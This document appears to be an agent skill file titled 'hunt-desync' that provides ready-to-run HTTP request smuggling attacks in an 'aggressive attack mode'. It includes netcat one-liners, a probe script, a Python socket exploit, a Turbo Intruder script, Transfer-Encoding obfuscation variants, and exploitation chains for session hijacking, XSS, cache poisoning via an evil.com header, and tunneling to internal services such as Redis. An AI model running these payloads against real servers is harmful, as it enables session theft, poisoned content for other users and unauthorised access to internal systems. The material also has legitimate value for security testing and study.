---
name: hunt-desync
description: HTTP request smuggling — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, prefix injection, request tunneling. Generates ready-to-run payloads, smuggler probes, and exploitation chains for credential hijacking, XSS, and cache poisoning. Uses HTTP Request Smuggler, smuggler.py, and manual techniques.
---

# HTTP REQUEST SMUGGLING — AGGRESSIVE ATTACK MODE

**Request smuggling chains to credential hijacking, XSS, and full cache poisoning in one request.**

## Quick Start

```bash
# CL.TE smuggling detection
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | \
  nc target.com 80

# TE.CL smuggling detection
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n' | \
  nc target.com 80
```

## Detection Methodology

### Smuggle Probe Pattern

```bash
#!/bin/bash
# smuggle-detect.sh — Test for request smuggling variants
TARGET="$1"
PORT="${2:-80}"

echo "[*] Testing CL.TE on $TARGET:$PORT"
printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' "$TARGET" | \
  nc -w 3 "$TARGET" "$PORT" > clte_resp.txt 2>&1

echo "[*] Testing TE.CL on $TARGET:$PORT"
printf 'POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n' "$TARGET" | \
  nc -w 3 "$TARGET" "$PORT" > tecl_resp.txt 2>&1

echo "[*] Responses saved to clte_resp.txt and tecl_resp.txt"
echo "[*] Analyze for differential responses or connection behavior"
```

### Differential Response Analysis

```bash
# Send smuggled request, observe if next legitimate request gets modified response
# Two-request technique:
# 1. Send smuggled request
# 2. Send normal request on same connection
# 3. If normal request response contains smuggled content → confirmed
```

## Attack Patterns

### CL.TE (Content-Length vs Transfer-Encoding)

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**How it works:**
- Front-end sees `Content-Length: 6`, forwards only `0\r\n\r\nX`
- Back-end sees `Transfer-Encoding: chunked`, processes `0` (end of chunked)
- `X` becomes prefix of next request on the connection

```python
#!/usr/bin/env python3
"""CL.TE smuggling exploit — inject request prefix."""
import socket
import sys

TARGET = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80

# Smuggled request (injected as prefix to next request)
smuggled = (
    "GET /admin HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Cookie: admin_session=STOLEN\r\n"
    "Connection: close\r\n"
    "\r\n"
)

# Chunked body that only consumes the CL
# The back-end sees this as chunked ending at "0"
body = f"0\r\n\r\n{smuggled}"

request = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {TARGET}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{body}"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TARGET, PORT))
sock.send(request.encode())
response = sock.recv(4096)
print(f"[+] Response:\n{response.decode(errors='replace')[:1000]}")
sock.close()
```

### TE.CL (Transfer-Encoding vs Content-Length)

Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`.

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

```

**How it works:**
- Front-end sees `Transfer-Encoding: chunked`, processes chunked encoding
- Back-end sees `Content-Length: 3`, reads only `8\r\n` and ignores rest
- `SMUGGLED\n0\r\n\r\n` becomes prefix of next request

### TE.TE (Transfer-Encoding Obfuscation)

Both agree on `Transfer-Encoding`, but parsing differs due to obfuscation.

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

8
SMUGGLED
0

```

```bash
# TE obfuscation variants
Transfer-Encoding: chunked
Transfer-Encoding: chunked,
Transfer-Encoding: chunked;
Transfer-Encoding: chunked\t
Transfer-Encoding: chunked\t\t
Transfer-Encoding: \tchunked
Transfer-Encoding: Chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunkedx
Transfer-Encoding: chunked x
```

### H2.CL (HTTP/2 Content-Length)

Abuse HTTP/2 with invalid `Content-Length` to smuggle requests.

```http
:method POST
:scheme https
:path /
:authority target.com
content-length: -1

```

```python
# HTTP/2 smuggling with h2 library
import h2.connection
import h2.events
import ssl
import socket

# Requires h2 library: pip install h2
```

### H2.TE (HTTP/2 Transfer-Encoding Injection)

```http
:method POST
:scheme https
:path /
:authority target.com
transfer-encoding: chunked

0

SMUGGLED_REQUEST
```

### Prefix Injection Attacks

Control the prefix that gets prepended to the next request.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /secret HTTP/1.1
Host: target.com

```

```python
# Inject arbitrary headers into next request
prefix_injection = (
    "0\r\n\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "X-Custom-Header: injected\r\n"
    "\r\n"
)
```

### Request Tunneling

Tunnel requests through front-end proxies to reach internal services.

```bash
# Tunnel to internal service via smuggled request
smuggled = (
    "CONNECT 127.0.0.1:6379 HTTP/1.1\r\n"
    "Host: 127.0.0.1:6379\r\n"
    "\r\n"
)

# Or tunnel GET requests to internal services
smuggled = (
    "GET http://internal-api:8080/admin HTTP/1.1\r\n"
    "Host: internal-api:8080\r\n"
    "\r\n"
)
```

## Exploitation Chains

### Credential Hijacking

```bash
# 1. Smuggle request that includes victim's cookie
# 2. Victim's next request on same connection gets the smuggled request
# 3. Receive response with victim's session data

# Payload: smuggled request steals session
smuggled_request = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Cookie: session=VICTIM_SESSION\r\n"
    "Content-Length: 0\r\n"
    "\r\n"
)
```

### XSS via Smuggled Request

```bash
# Smuggle XSS payload into user's next request
smuggled = (
    "GET /search?q=<script>alert(1)</script> HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "\r\n"
)
```

### Cache Poisoning

```bash
# 1. Smuggle request with different path
# 2. Cache serves poisoned content on legitimate path

smuggled = (
    "GET /static/legit.js HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "X-Forwarded-Host: evil.com\r\n"
    "\r\n"
)
```

## HTTP Request Smuggler (Burp Extension)

### Usage

1. Install from BApp Store
2. Select requests in Burp Proxy/Repeater
3. Right-click → Extensions → HTTP Request Smuggler → Smuggle probe (CL.TE)
4. Analyze responses for differential behavior

### Configuration

```python
# Custom Turbo Intruder script for smuggling
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    # CL.TE probe
    smuggled = (
        "0\r\n\r\n"
        "GET /smuggled HTTP/1.1\r\n"
        "X-Smuggled: true\r\n"
        "Host: target.com\r\n"
        "\r\n"
    )

    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: target.com\r\n"
        f"Content-Length: {len(smuggled)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{smuggled}"
    )

    engine.queue(request)
    engine.queue(target.basepath)

def handleResponse(req, interesting):
    if "X-Smuggled" in str(req):
        table.add(req)
```

## smuggler.py

```bash
# Install
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Basic detection
python3 smuggler.py -u https://target.com -p 443 -t https

# Test specific endpoint
python3 smuggler.py -u https://target.com/api -p 443 -t https --test /admin

# Custom payloads
python3 smuggler.py -u https://target.com -p 443 -t https --payload custom.txt
```

## Checklist

- [ ] Test CL.TE variant (Content-Length first)
- [ ] Test TE.CL variant (Transfer-Encoding first)
- [ ] Test TE.TE with Transfer-Encoding obfuscation
- [ ] Test HTTP/2 smuggling if H2 supported
- [ ] Test prefix injection (control smuggled prefix content)
- [ ] Test request tunneling to internal services
- [ ] Test cache poisoning via smuggling
- [ ] Test credential hijacking chain
- [ ] Test XSS injection via smuggled request
- [ ] Test behind load balancer / reverse proxy
- [ ] Test with keep-alive connections
- [ ] Analyze differential responses

## Tools

- **HTTP Request Smuggler** (Burp) — Automated detection + exploitation
- **smuggler.py** — Standalone CL.TE/TE.CL detection
- **Turbo Intruder** — Custom smuggling scripts
- **curl** — Manual CL/TE testing
- **nc (netcat)** — Raw socket smuggling payloads

## Severity

| Smuggling Impact | Severity |
|-----------------|----------|
| Credential hijacking | Critical |
| XSS injection | High |
| Cache poisoning | High |
| WAF bypass | High |
| Access control bypass | High |
| Internal service access | Medium |
| Information disclosure | Medium |
